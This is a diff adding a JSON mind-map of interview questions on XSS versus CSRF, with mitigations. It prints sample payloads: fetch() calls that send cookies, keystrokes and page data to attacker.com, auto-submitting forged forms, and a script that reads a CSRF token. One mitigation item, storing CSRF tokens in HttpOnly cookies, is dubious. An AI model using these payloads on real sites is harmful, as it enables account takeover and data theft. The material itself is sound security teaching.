+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4055ba44c3d4544",
+                  "title": "XSS: Script injection",
+                  "markdown": "- XSS: Script injection",
+                  "notes": "XSS: Script injection",
+                  "blurb": "XSS: Script injection",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "na9a97533cf39607",
+                  "title": "CSRF: Form submission",
+                  "markdown": "- CSRF: Form submission",
+                  "notes": "CSRF: Form submission",
+                  "blurb": "CSRF: Form submission",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nbbeb9dcbe30c7a1",
+                  "title": "XSS: Output encoding, CSP",
+                  "markdown": "- XSS: Output encoding, CSP",
+                  "notes": "XSS: Output encoding, CSP",
+                  "blurb": "XSS: Output encoding, CSP",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n115232efb79de96",
+                  "title": "CSRF: CSRF tokens, SameSite cookies",
+                  "markdown": "- CSRF: CSRF tokens, SameSite cookies",
+                  "notes": "CSRF: CSRF tokens, SameSite cookies",
+                  "blurb": "CSRF: CSRF tokens, SameSite cookies",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Includes XSS: Execute malicious scripts in victim's browser",
+              "expanded": false
+            },
+            {
+              "id": "n963e04f0db5370e",
+              "title": "Does preventing XSS also prevent CSRF?",
+              "markdown": "**Answer:**\n\n**No, preventing XSS does not prevent CSRF.** They are different vulnerabilities requiring different mitigation strategies.\n\n**XSS Prevention:**",
+              "notes": "Answer:\n\nNo, preventing XSS does not prevent CSRF. They are different vulnerabilities requiring different mitigation strategies.\n\nXSS Prevention:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n76f9b049a949862",
+                  "title": "Output encoding",
+                  "markdown": "- Output encoding",
+                  "notes": "Output encoding",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc17a303e1c01dd3",
+                  "title": "Content Security Policy (CSP)",
+                  "markdown": "- Content Security Policy (CSP)",
+                  "notes": "Content Security Policy (CSP)",
+                  "blurb": "Content Security Policy (CSP)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n9c6d81988e41194",
+                  "title": "Input validation",
+                  "markdown": "- Input validation",
+                  "notes": "Input validation",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n08e5e830abb6402",
+                  "title": "CSRF tokens",
+                  "markdown": "- CSRF tokens",
+                  "notes": "CSRF tokens",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb4c4c28eb79ef2e",
+                  "title": "SameSite cookies",
+                  "markdown": "- SameSite cookies",
+                  "notes": "SameSite cookies",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ne87b9a29f11f226",
+                  "title": "Origin/Referer header validation",
+                  "markdown": "- Origin/Referer header validation",
+                  "notes": "Origin/Referer header validation",
+                  "blurb": "Origin/Referer header validation",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Answer: No, preventing XSS does not prevent CSRF.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes What are the key differences between XSS and CSRF?",
+          "expanded": false
+        },
+        {
+          "id": "nac40d140844db13",
+          "title": "Fundamental Questions",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "ncb86815fe942770",
+              "title": "Can CSRF work without XSS?",
+              "markdown": "**Answer:**\n\n**Yes, CSRF can work without XSS.** CSRF exploits browser's automatic cookie sending behavior, not script execution.\n\n**CSRF Attack (No XSS Required):**\n\n```html\n\n<form id=\"transfer\" action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker_account\" />\n  <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script>document.getElementById('transfer').submit();</script>\n\n```\n\n**How It Works:**",
+              "notes": "Answer:\n\nYes, CSRF can work without XSS. CSRF exploits browser's automatic cookie sending behavior, not script execution.\n\nCSRF Attack (No XSS Required):\n\n<form id=\"transfer\" action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attackeraccount\" />\n  <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script>document.getElementById('transfer').submit();</script>\n\nHow It Works:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n5abe5f9a6c1ca7c",
+                  "title": "Victim visits attacker's page",
+                  "markdown": "- Victim visits attacker's page",
+                  "notes": "Victim visits attacker's page",
+                  "blurb": "Victim visits attacker's page",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n826a9d789f018f5",
+                  "title": "Form automatically submits to bank.com",
+                  "markdown": "- Form automatically submits to bank.com",
+                  "notes": "Form automatically submits to bank.com",
+                  "blurb": "Form automatically submits to bank.com",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1c0d252502bdbc0",
+                  "title": "Browser includes session cookie (automatic behavior)",
+                  "markdown": "- Browser includes session cookie (automatic behavior)",
+                  "notes": "Browser includes session cookie (automatic behavior)",
+                  "blurb": "Browser includes session cookie (automatic behavior)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nfa6f9415d9f7154",
+                  "title": "Bank processes transfer (trusts cookie)",
+                  "markdown": "- Bank processes transfer (trusts cookie)",
+                  "notes": "Bank processes transfer (trusts cookie)",
+                  "blurb": "Bank processes transfer (trusts cookie)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Answer: Yes, CSRF can work without XSS.",
+              "expanded": false
+            },
+            {
+              "id": "n3cbd32ef10787ba",
+              "title": "Can XSS be used to steal more than just cookies?",
+              "markdown": "**Answer:**\n\n**Yes, XSS can be used for multiple attack vectors:**\n\n**1. Cookie Theft:**\n\n```jsx\nfetch('http://attacker.com/steal?cookie=' + document.cookie);\n\n```\n\n**2. Keylogging:**\n\n```jsx\ndocument.addEventListener('keypress', function(e) {\n    fetch('http://attacker.com/steal?key=' + e.key);\n});\n\n```\n\n**3. Phishing:**\n\n```jsx\n// Inject fake login form\ndocument.body.innerHTML = '<form>...</form>';\n\n```\n\n**4. Data Theft:**\n\n```jsx\nvar data = document.getElementById('sensitive-data').innerHTML;\nfetch('http://attacker.com/steal?data=' + data);\n\n```\n\n**5. Defacement:**\n\n```jsx\ndocument.body.innerHTML = '<h1>HACKED</h1>';\n\n```\n\n**Key Point:** XSS is much more versatile than just cookie theft.",
+              "notes": "Answer:\n\nYes, XSS can be used for multiple attack vectors:\n\n1. Cookie Theft:\n\nfetch('http://attacker.com/steal?cookie=' + document.cookie);\n\n2. Keylogging:\n\ndocument.addEventListener('keypress', function(e) {\n    fetch('http://attacker.com/steal?key=' + e.key);\n});\n\n3. Phishing:\n\n// Inject fake login form\ndocument.body.innerHTML = '<form>...</form>';\n\n4. Data Theft:\n\nvar data = document.getElementById('sensitive-data').innerHTML;\nfetch('http://attacker.com/steal?data=' + data);\n\n5. Defacement:\n\ndocument.body.innerHTML = '<h1>HACKED</h1>';\n\nKey Point: XSS is much more versatile than just cookie theft.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "Answer: Yes, XSS can be used for multiple attack vectors: 1.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Can CSRF work without XSS?",
+          "expanded": false
+        },
+        {
+          "id": "nce97b916f340214",
+          "title": "Mitigation Questions",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nd9da4aae271e5c7",
+              "title": "How do you prevent both XSS and CSRF?",
+              "markdown": "**Answer:**\n\n**XSS Prevention:**\n\n```python\n# 1. Output encoding\nfrom html import escape\ndef display_comment(comment):\n    return escape(comment)\n\n# 2. Content Security Policy\n# Content-Security-Policy: default-src 'self'; script-src 'self'\n\n# 3. HttpOnly cookies\n# Set-Cookie: session=abc123; HttpOnly; Secure\n\n```\n\n**CSRF Prevention:**\n\n```python\n# 1. CSRF tokens\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrf_token')\n    if not validate_csrf_token(token):\n        return \"Invalid CSRF token\", 403\n    # Process transfer\n\n# 2. SameSite cookies\n# Set-Cookie: session=abc123; SameSite=Strict; Secure\n\n# 3. Origin header validation\nif request.headers.get('Origin') != 'https://example.com':\n    return \"Invalid origin\", 403\n\n```\n\n**Best Practice:** Implement both XSS and CSRF protection using defense in depth.",
+              "notes": "Answer:\n\nXSS Prevention:\n\n1. Output encoding\nfrom html import escape\ndef displaycomment(comment):\n    return escape(comment)\n\n2. Content Security Policy\nContent-Security-Policy: default-src 'self'; script-src 'self'\n\n3. HttpOnly cookies\nSet-Cookie: session=abc123; HttpOnly; Secure\n\nCSRF Prevention:\n\n1. CSRF tokens\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrftoken')\n    if not validatecsrftoken(token):\n        return \"Invalid CSRF token\", 403\n    # Process transfer\n\n2. SameSite cookies\nSet-Cookie: session=abc123; SameSite=Strict; Secure\n\n3. Origin header validation\nif request.headers.get('Origin') != 'https://example.com':\n    return \"Invalid origin\", 403\n\nBest Practice: Implement both XSS and CSRF protection using defense in depth.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "Answer: XSS Prevention: 1.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes How do you prevent both XSS and CSRF?",
+          "expanded": false
+        },
+        {
+          "id": "ne5ee05a9cb56cb2",
+          "title": "Scenario-Based Questions",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nc6dd08c2740e03d",
+              "title": "An attacker wants to change a user's email address. Would they use XSS...",
+              "markdown": "**Answer:**\n\n**They could use either, but CSRF is more common:**\n\n**CSRF Approach (Common):**\n\n```html\n\n<form action=\"https://site.com/change-email\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.forms[0].submit();</script>\n\n```\n\n**XSS Approach (Less Common, Requires XSS Vulnerability):**\n\n```jsx\n// Requires XSS vulnerability first\nfetch('/change-email', {\n    method: 'POST',\n    body: 'email=attacker@evil.com'\n});\n\n```\n\n**Why CSRF is More Common:**",
+              "notes": "Answer:\n\nThey could use either, but CSRF is more common:\n\nCSRF Approach (Common):\n\n<form action=\"https://site.com/change-email\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.forms[0].submit();</script>\n\nXSS Approach (Less Common, Requires XSS Vulnerability):\n\n// Requires XSS vulnerability first\nfetch('/change-email', {\n    method: 'POST',\n    body: 'email=attacker@evil.com'\n});\n\nWhy CSRF is More Common:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n6b4cd4cb54f9d8e",
+                  "title": "Doesn't require existing XSS vulnerability",
+                  "markdown": "- Doesn't require existing XSS vulnerability",
+                  "notes": "Doesn't require existing XSS vulnerability",
+                  "blurb": "Doesn't require existing XSS vulnerability",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n42246993f88ebc3",
+                  "title": "Simpler attack vector",
+                  "markdown": "- Simpler attack vector",
+                  "notes": "Simpler attack vector",
+                  "blurb": "Simpler attack vector",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n80c643bc709586b",
+                  "title": "Works if user is authenticated",
+                  "markdown": "- Works if user is authenticated",
+                  "notes": "Works if user is authenticated",
+                  "blurb": "Works if user is authenticated",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Answer: They could use either, but CSRF is more common: CSRF Approach...",
+              "expanded": false
+            },
+            {
+              "id": "n4dcbc1ed6b51b23",
+              "title": "Can XSS and CSRF be combined in an attack?",
+              "markdown": "**Answer:**\n\n**Yes, XSS can be used to bypass CSRF protection:**\n\n**Scenario:**\n\n1. XSS vulnerability allows script injection\n2. Script reads CSRF token from page\n3. Script uses token to perform CSRF attack\n\n**Attack:**\n\n```jsx\n// 1. XSS payload reads CSRF token\nvar csrf_token = document.querySelector('input[name=\"csrf_token\"]').value;\n\n// 2. Use token to perform CSRF attack\nfetch('/transfer', {\n    method: 'POST',\n    body: 'amount=10000&to=attacker&csrf_token=' + csrf_token\n});\n\n```\n\n**Mitigation:**",
+              "notes": "Answer:\n\nYes, XSS can be used to bypass CSRF protection:\n\nScenario:\n\n1. XSS vulnerability allows script injection\n2. Script reads CSRF token from page\n3. Script uses token to perform CSRF attack\n\nAttack:\n\n// 1. XSS payload reads CSRF token\nvar csrftoken = document.querySelector('input[name=\"csrftoken\"]').value;\n\n// 2. Use token to perform CSRF attack\nfetch('/transfer', {\n    method: 'POST',\n    body: 'amount=10000&to=attacker&csrftoken=' + csrftoken\n});\n\nMitigation:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "naeddead1d910933",
+                  "title": "Prevent XSS (output encoding)",
+                  "markdown": "- Prevent XSS (output encoding)",
+                  "notes": "Prevent XSS (output encoding)",
+                  "blurb": "Prevent XSS (output encoding)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n3328aaa1dbf6b62",
+                  "title": "Store CSRF tokens in HttpOnly cookies",
+                  "markdown": "- Store CSRF tokens in HttpOnly cookies",
+                  "notes": "Store CSRF tokens in HttpOnly cookies",
+                  "blurb": "Store CSRF tokens in HttpOnly cookies",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n58588e3017eeb70",
+                  "title": "Use additional validation beyond tokens",
+                  "markdown": "- Use additional validation beyond tokens",
+                  "notes": "Use additional validation beyond tokens",
+                  "blurb": "Use additional validation beyond tokens",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Answer: Yes, XSS can be used to bypass CSRF protection: Scenario: 1.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes An attacker wants to change a user's email address. Would they use XS",
+          "expanded": false
+        },
+        {
+          "id": "n8f6673a4a722bba",
+          "title": "Depth: Interview follow-ups \u2014 XSS vs CSRF",
+          "markdown": "**Authoritative references:** OWASP cheat sheets for [XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).\n\n**Follow-ups:**",
+          "notes": "Authoritative references: OWASP cheat sheets for XSS and CSRF.\n\nFollow-ups:",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "na007021d60f4c4f",
+              "title": "One sentence distinction: XSS executes script in victim browser; CSRF forges cross-site",
+              "markdown": "- One sentence distinction: XSS executes script in victim browser; CSRF forges cross-site",
+              "notes": "One sentence distinction: XSS executes script in victim browser; CSRF forges cross-site",
+              "blurb": "One sentence distinction: XSS executes script in victim browser; CSRF forges...",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nd58d3b19cc5ab87",
+              "title": "Can CSRF tokens stop XSS? (No-attacker reads token via XSS.)",
+              "markdown": "- Can CSRF tokens stop XSS? (No-attacker reads token via XSS.)",
+              "notes": "Can CSRF tokens stop XSS? (No-attacker reads token via XSS.)",
+              "blurb": "Can CSRF tokens stop XSS?",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n03f2f6da84c85f7",
+              "title": "Defense pairing: HttpOnly limits token theft but not CSRF action while session alive.",
+              "markdown": "- Defense pairing: HttpOnly limits token theft but not CSRF action while session alive.",
+              "notes": "Defense pairing: HttpOnly limits token theft but not CSRF action while session alive.",
+              "blurb": "Defense pairing: HttpOnly limits token theft but not CSRF action while...",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Authoritative references: OWASP cheat sheets for XSS and CSRF.",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Comparison Questions"
+    }
+  ],
+  "topicId": "xss-vs-csrf",
+  "name": "XSS vs CSRF",
+  "structure": "logic-right",
+  "blurb": "Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of..."
+}
